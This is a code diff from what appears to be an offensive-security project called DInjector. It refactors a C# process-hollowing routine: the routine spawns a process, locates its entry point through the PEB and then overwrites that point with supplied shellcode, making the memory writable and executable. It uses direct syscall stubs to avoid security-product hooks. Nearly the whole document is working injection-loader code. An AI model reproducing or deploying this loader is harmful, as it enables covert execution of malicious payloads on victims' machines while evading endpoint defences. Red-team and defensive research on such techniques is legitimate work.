@@ -7,69 +7,8 @@ namespace DInjector
 {
     class ProcessHollowing
     {
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate Boolean CreateProcess(
-            string lpApplicationName,
-            string lpCommandLine,
-            IntPtr lpProcessAttributes,
-            IntPtr lpThreadAttributes,
-            bool bInheritHandles,
-            DI.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
-            IntPtr lpEnvironment,
-            string lpCurrentDirectory,
-            ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
-            out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtQueryInformationProcess(
-            IntPtr ProcessHandle,
-            DI.Data.Native.PROCESSINFOCLASS ProcessInformationClass,
-            ref DI.Data.Native.PROCESS_BASIC_INFORMATION ProcessInformation,
-            uint ProcessInformationLength,
-            ref uint ReturnLength);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtReadVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            IntPtr Buffer,
-            uint NumberOfBytesToRead,
-            ref uint NumberOfBytesReaded);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            uint NewProtect,
-            out uint OldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            IntPtr Buffer,
-            uint BufferLength,
-            ref uint BytesWritten);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtResumeThread(
-            IntPtr ThreadHandle,
-            ref uint SuspendCount);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate bool CloseHandle(IntPtr hObject);
-
-        private static bool closeHandle(IntPtr hObject)
+        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false)
         {
-            object[] parameters = { hObject };
-            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
-        }
-
-        public static void Execute(byte[] shellcodeBytes, string processImage, int ppid = 0, bool blockDlls = false)
-        {
-            var shellcode = shellcodeBytes;
-
             #region CreateProcessA
 
             var pi = SpawnProcess.Execute(
@@ -83,16 +22,12 @@ namespace DInjector
 
             #region NtQueryInformationProcess
 
-            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueryInformationProcess");
-            NtQueryInformationProcess sysNtQueryInformationProcess = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueryInformationProcess));
-
             IntPtr hProcess = pi.hProcess;
             DI.Data.Native.PROCESS_BASIC_INFORMATION bi = new DI.Data.Native.PROCESS_BASIC_INFORMATION();
             uint returnLength = 0;
-            DI.Data.Native.NTSTATUS ntstatus;
 
             // Query created process to extract its base address pointer from PEB (Process Environment Block)
-            ntstatus = sysNtQueryInformationProcess(
+            var ntstatus = Syscalls.NtQueryInformationProcess(
                 hProcess,
                 DI.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
                 ref bi,
@@ -108,9 +43,6 @@ namespace DInjector
 
             #region NtReadVirtualMemory
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
-            NtReadVirtualMemory sysNtReadVirtualMemory = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtReadVirtualMemory));
-
             // Pointer to the base address of the EXE image: BASE_ADDR_PTR = PEB_ADDR + 0x10
             IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
             IntPtr baseAddress = Marshal.AllocHGlobal(IntPtr.Size);
@@ -118,7 +50,7 @@ namespace DInjector
             uint bytesRead = 0;
 
             // Read 8 bytes of memory (IntPtr.Size is 8 bytes for x64) pointed by the image base address pointer (ptrImageBaseAddress) in order to get the actual value of the image base address
-            ntstatus = sysNtReadVirtualMemory(
+            ntstatus = Syscalls.NtReadVirtualMemory(
                 hProcess,
                 ptrImageBaseAddress,
                 baseAddress,
@@ -138,8 +70,10 @@ namespace DInjector
             IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
             IntPtr data = Marshal.AllocHGlobal(0x200);
 
+            bytesRead = 0;
+
             // Read 0x200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address
-            ntstatus = sysNtReadVirtualMemory(
+            ntstatus = Syscalls.NtReadVirtualMemory(
                 hProcess,
                 imageBaseAddress,
                 data,
@@ -168,19 +102,16 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
-            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
             IntPtr protectAddress = entrypointAddress;
             IntPtr regionSize = (IntPtr)shellcode.Length;
             uint oldProtect = 0;
 
-            ntstatus = sysNtProtectVirtualMemory(
+            ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
-                out oldProtect);
+                ref oldProtect);
 
             if (ntstatus == 0)
                 Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
@@ -191,16 +122,13 @@ namespace DInjector
 
             #region NtWriteVirtualMemory
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
-            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
-
             var buffer = Marshal.AllocHGlobal(shellcode.Length);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
 
             uint bytesWritten = 0;
 
             // Write the shellcode to the EntryPoint address
-            ntstatus = sysNtWriteVirtualMemory(
+            ntstatus = Syscalls.NtWriteVirtualMemory(
                 hProcess,
                 entrypointAddress,
                 buffer,
@@ -216,12 +144,12 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (oldProtect)
 
-            ntstatus = sysNtProtectVirtualMemory(
+            ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 oldProtect,
-                out uint _);
+                ref oldProtect);
 
             if (ntstatus == 0)
                 Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, oldProtect");
@@ -232,12 +160,9 @@ namespace DInjector
 
             #region NtResumeThread
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtResumeThread");
-            NtResumeThread sysNtResumeThread = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtResumeThread));
-
             uint suspendCount = 0;
 
-            ntstatus = sysNtResumeThread(
+            ntstatus = Syscalls.NtResumeThread(
                 pi.hThread,
                 ref suspendCount);
 
@@ -248,8 +173,8 @@ namespace DInjector
 
             #endregion
 
-            closeHandle(pi.hThread);
-            closeHandle(hProcess);
+            Win32.CloseHandle(pi.hThread);
+            Win32.CloseHandle(hProcess);
         }
     }
 }
